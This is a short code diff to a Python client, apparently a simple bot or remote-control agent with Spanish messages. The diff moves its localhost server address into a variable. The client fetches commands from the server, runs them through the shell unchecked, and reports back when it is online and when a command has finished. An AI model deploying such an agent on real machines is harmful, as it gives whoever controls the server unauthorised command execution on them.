@@ -6,10 +6,10 @@ import multiprocessing
 import subprocess
 import sys
 
-
+server = "http://127.0.0.1:4432"
 
 def get_cmd():
-    cmd = requests.get('http://127.0.0.1/getcmd')
+    cmd = requests.get(server + '/getcmd')
     if cmd.text == "":
         print("ESPERANDO A UN COMANDO")
     else:
@@ -22,14 +22,14 @@ def run_ssh(cmd):
         output = subprocess.check_output(cmd.text, shell=True).decode('utf-8')
         print(output)
         time.sleep(8)
-        requests.get('http://127.0.0.1/cmdfinished')
+        requests.get(server + '/cmdfinished')
     except Exception:
         print("Ha habido un error con su comando")
 
 
 def online():
     try:
-        requests.get('http://127.0.0.1/imonline?id='+id)
+        requests.get(server + '/imonline?id='+id)
     except Exception:
         print("\nNo se ha podido conectar con el servidor")
 
